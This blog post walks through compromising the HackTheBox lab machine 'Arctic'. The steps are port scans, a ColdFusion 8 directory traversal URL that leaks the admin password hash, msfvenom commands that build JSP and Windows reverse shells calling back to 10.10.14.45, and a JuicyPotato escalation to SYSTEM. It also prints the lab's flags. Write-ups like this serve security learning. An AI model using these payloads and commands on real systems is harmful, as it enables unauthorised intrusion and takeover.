---
layout: post
title: "Arctic Writeup - HackTheBox"
category: HackTheBox
---
# HTB lab Machine - Arctic

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.51.4 folder that I have attached to this post.

## Enumeration summary

```
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%),
```

```
PORT      STATE         SERVICE      REASON      VERSION
53/udp    open|filtered domain       no-response
67/udp    open|filtered dhcps        no-response
68/udp    open|filtered dhcpc        no-response
69/udp    open|filtered tftp         no-response
123/udp   open|filtered ntp          no-response
135/udp   open|filtered msrpc        no-response
137/udp   open|filtered netbios-ns   no-response
138/udp   open|filtered netbios-dgm  no-response
139/udp   open|filtered netbios-ssn  no-response
161/udp   open|filtered snmp         no-response
162/udp   open|filtered snmptrap     no-response
445/udp   open|filtered microsoft-ds no-response
500/udp   open|filtered isakmp       no-response
514/udp   open|filtered syslog       no-response
520/udp   open|filtered route        no-response
631/udp   open|filtered ipp          no-response
1434/udp  open|filtered ms-sql-m     no-response
1900/udp  open|filtered upnp         no-response
4500/udp  open|filtered nat-t-ike    no-response
49152/udp open|filtered unknown      no-response
```

![image-20210508103829598](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508103829598.png)

## Exploitation

port 8500 has adobe coldfusion running. went to /CFIDE/componentutils/cfcexplorer.cfc. Did not have a passsword. Found this exploit: https://www.exploit-db.com/exploits/14641, which lead me to this dir traversal:

```
http://10.129.51.4:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

This gave me the following output:

![image-20210508104641917](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508104641917.png)

Thats a sha1:

![image-20210508104656823](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508104656823.png)

Generated payload and started listener for 4343:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.45 LPORT=4343 -f raw > shell.jsp
```

I went on to `http://10.129.51.4:8500/CFIDE/administrator/index.cfm` -> Debugging &  Logging -> add new scheduled task:

![image-20210508105931528](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508105931528.png)

Found path to be C:\ColdFusion8\wwwroot\CFIDE on http://10.129.51.4:8500/CFIDE/administrator/reports/index.cfm. So I adjusted the filepath for .\shell.jsp afterwards.	

Run the scheduled task, run the shell.jsp file via the webbrowser:

```
C:\Users\tolis\Desktop>type user.txt
type user.txt
02650d3a69a70780c302e146a6cb96f3
C:\Users\tolis\Desktop>whoami
whoami
arctic\tolis

C:\Users\tolis\Desktop>

```

Lol is it juicy potato time again:

```
C:\Users\tolis\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

Lol this was just like bastard:

```
C:\Users\tolis\Desktop>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          10/5/2021, 1:04:57 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 130 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.059 MB
Virtual Memory: In Use:    988 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.51.4
                                 [02]: fe80::19ab:9cc1:79f3:fbad
                                 [03]: dead:beef::19ab:9cc1:79f3:fbad

C:\Users\tolis\Desktop>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
OSArchitecture  
64-bit          

```

Ez:

```
kali@kali:~/Desktop/DownloadedScripts$ msfvenom --platform Windows -p windows/x64/shell_reverse_tcp lhost=10.10.14.45 lport=9999 -f exe > shell.exe
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

```
C:\Users\tolis\Desktop>jp.exe -t * -p shell.exe -l 9999 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
jp.exe -t * -p shell.exe -l 9999 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 9999
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\Users\Administrator\Desktop

22/03/2017  10:02 ��    <DIR>          .
22/03/2017  10:02 ��    <DIR>          ..
22/03/2017  10:02 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  33.187.307.520 bytes free

C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ce65ceee66b2b5ebaff07e50508ffb90
C:\Users\Administrator\Desktop>

```

## Final thoughts

this is to easy for words. 20 pts on OSCP.
